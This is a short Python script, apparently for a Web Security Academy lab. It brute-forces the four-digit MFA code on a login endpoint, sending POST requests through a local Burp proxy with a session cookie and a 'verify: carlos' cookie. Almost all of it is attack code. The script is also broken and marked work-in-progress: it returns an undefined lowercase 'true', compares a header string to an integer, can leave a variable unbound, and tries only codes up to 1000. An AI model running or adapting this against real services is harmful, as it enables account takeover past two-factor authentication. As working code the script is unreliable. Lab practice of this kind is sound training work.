from random import randint
from time import sleep

import requests
import os
import json

'''
Brute-forcing parameterized requests with a varying interval, sending those through burp
'''

# setup the variables for requests to go through burp
# https://www.th3r3p0.com/random/python-requests-and-burp-suite.html
os.environ['REQUESTS_CA_BUNDLE'] = 'burp_cert.pem'
os.environ['HTTP_PROXY'] = "http://127.0.0.1:8080"
os.environ['HTTPS_PROXY'] = "http://127.0.0.1:8080"


import requests

burp0_url = "https://ac411f4a1f08caab80493480000e001e.web-security-academy.net:443/login2"
burp0_cookies = {"session": "UDCqQV18YjdXfB4OTItd4fpz03blez3L", "verify": "carlos"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36", "Accept-Encoding": "gzip, deflate", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Connection": "close", "Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "https://ac411f4a1f08caab80493480000e001e.web-security-academy.net", "Content-Type": "application/x-www-form-urlencoded", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://ac411f4a1f08caab80493480000e001e.web-security-academy.net/login2", "Accept-Language": "en-US,en;q=0.9"}
burp0_data = {"mfa-code": "0383"}

min_sleep_in_millis = 3
max_sleep_in_millis = 20


def brute_request(url=None, cookies=None, headers=None):
  found_code = False
  for le_brut in range(1001):
    sleepy_time = randint(min_sleep_in_millis, max_sleep_in_millis)/1000
    # print(f"sleeping for {sleepy_time}")
    # sleep(sleepy_time)
    data = {"mfa-code": f"{le_brut:04}"}
    found_match = send_request_and_check_response(
        url, headers=headers, cookies=cookies, data=data)
    if found_match:
      print("found the matching code")
      break

  if not found_match:
    print("didn't find the desired response")


def send_request_and_check_response(url, cookies, headers, data) -> bool:
  response = requests.post(url, headers=headers, cookies=cookies, data=data)
  # print(response)
  # matching response is empty and has a 'location' header for redirect
  # WIP not quite matching... not sure why yet...
  if response.headers['Content-Length'] == 0 and response.headers.get('Location') is not None:
    return true


#brute_request(url=burp0_url, cookies=burp0_cookies, headers=burp0_headers)
send_request_and_check_response(url=burp0_url, cookies=burp0_cookies, headers=burp0_headers, data=burp0_data)
